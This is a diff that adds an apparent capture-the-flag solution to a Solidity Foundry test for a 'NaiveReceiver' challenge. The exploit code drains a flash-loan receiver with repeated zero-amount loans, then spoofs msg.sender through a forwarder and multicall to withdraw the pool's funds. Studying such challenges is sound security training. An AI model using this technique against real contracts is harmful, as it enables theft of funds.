@@ -77,7 +77,52 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory callDatas = new bytes[](11);
+        for (uint256 i = 0; i < 10; i++) {
+            // function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
+        }
+        // function withdraw(uint256 amount, address payable receiver)
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            // add the deployer address to the callDatas 
+            // since the naiveReceiverPool will check with the last 20 bytes of the callData as the msg.sender if it was called by the forwarder
+            // the money is controller by the deployer address
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        // wrap all calls in a multicall
+        bytes memory multicallData;
+        multicallData = abi.encodeCall(pool.multicall, (callDatas));
+
+        // make the request to be forwarded by the basic forwarder
+        /*
+        struct Request {
+            address from;
+            address target;
+            uint256 value;
+            uint256 gas;
+            uint256 nonce;
+            bytes data;
+            uint256 deadline;
+        } 
+        */
+        BasicForwarder.Request memory request =
+            BasicForwarder.Request(player, address(pool), 0, 3000000, forwarder.nonces(player), multicallData, 1 days);
+        // creates the request hash like EIP-712
+        // 0x19 0x01 <domain separator> <structHash>
+        // domain separator is the hash struct of the domain struct with its field values
+        // structHash is the hash of the request struct with its field values
+        bytes1 prefix = 0x19;
+        bytes1 version = 0x01;
+        bytes32 domainSeparator = forwarder.domainSeparator();
+        bytes32 structHash = forwarder.getDataHash(request);
+
+        bytes32 requestHash = keccak256(abi.encodePacked(prefix, version, domainSeparator, structHash));
+        // use vm.sign to sign the request hash using the player private key
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        require(forwarder.execute(request, signature));
     }
 
     /**
